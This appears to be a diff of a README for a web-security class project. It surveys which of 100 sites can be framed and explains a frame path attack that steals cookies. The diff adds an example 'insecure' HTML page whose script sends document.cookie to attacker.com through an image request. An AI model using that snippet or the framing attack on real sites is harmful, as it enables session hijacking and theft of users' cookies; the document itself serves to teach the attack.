@@ -8,6 +8,15 @@
 * [code](code) - contains scripts and output files 
 * [framable](framable) - contains html files created for 100 sites
 
+### Summary
+
+* Number of framable sites - 28
+* Number of non framable sites - 69
+* number of sites did not resolve - 3
+
+### Youtube video is available at: https://youtu.be/QLgFOZIHSOI 
+
+
 * Framable sites out of 100 sites
 
 |    | Site                |
@@ -125,14 +134,6 @@
 
 <kbd><img src="screenshots/iframe_not_loaded.png" width="700" ></kbd>
 
-### Summary
-
-* Number of framable sites - 28
-* Number of non framable sites - 69
-* number of sites did not resolve - 3
-
-### Youtube video is available at: https://youtu.be/QLgFOZIHSOI 
-
 
  ## Question 2 - Frame path attack
  
@@ -150,7 +151,23 @@ user login.
 
  * Insecure html page
 
-<kbd><img src="screenshots/insecure_html.PNG" width="700" ></kbd>
+ ```
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Insecure Page</title>
+</head>
+<body>
+    <h1>Welcome to our website!</h1>
+    <script>
+        // Simulating a malicious script injected by an attacker
+        const img = new Image();
+        img.src = "https://attacker.com/steal?cookie=" + document.cookie;
+    </script>
+</body>
+</html>
+ ```
 
  **Example futher explained**
  
@@ -164,10 +181,12 @@ user login.
 
  ### List of files
 
- * [child.html](child.html) - html page with a cookie and which is being framed by parent page
- * [parent.html](parent.html) - html page which steal cookie from child page
- * [index_c.js](index_c.js) - server used to render child.html
- * [index_p.js](index_p.js) - server used to render parent.html
+ * [frame-path-attack/child.html](child.html) - html page with a cookie and which is being framed by parent page
+ * [frame-path-attack/parent.html](parent.html) - html page which steal cookie from child page
+ * [frame-path-attack/index_c.js](index_c.js) - server used to render child.html
+ * [frame-path-attack/index_p.js](index_p.js) - server used to render parent.html
+
+ ### Youtube video is available at: https://youtu.be/FRpULEejpPA   
 
  * child.html page with a cookie having path attribute.
 
@@ -224,4 +243,4 @@ user login.
 
   <kbd><img src="screenshots/parent_page with _stolen_cookie.png" width="700" ></kbd>
 
-  ### Youtube video is available at: https://youtu.be/FRpULEejpPA 
+  
